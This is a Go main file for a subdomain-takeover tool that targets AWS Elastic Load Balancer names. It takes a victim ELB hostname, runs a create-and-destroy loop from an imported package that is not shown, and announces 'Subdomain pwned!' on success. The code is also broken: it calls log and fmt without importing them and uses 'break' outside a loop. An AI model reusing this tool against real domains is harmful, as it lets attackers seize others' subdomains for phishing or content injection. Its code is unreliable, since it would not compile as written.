package main

import (
	"flag"
	"net/http"

	// Prometheus Libraries
	"github.com/prometheus/client_golang/prometheus/promhttp"

	// elb-subdomain-taker packages
	"github.com/rira12621/pkg/elbloop"
)

func main() {
	// serve metrics on 2112
	http.Handle("/metrics", promhttp.Handler())
	go func() {
		http.ListenAndServe(":2112", nil)
	}()

	// CLI flags
	elbPtr := flag.String("elb", "", "the elb to take over - myelb-1234.elb.amazonaws.com")
	// Parse flags
	flag.Parse()
	if *elbPtr == "" {
		log.Fatal("You have to Specify the ELB")
	}
	if elbloop.CreateDestroyLoop(*elbPtr) == true {
		fmt.Println("Found match!")
		fmt.Println("ELB created!")
		fmt.Println("Subdomain pwned!")
		break
	}
}
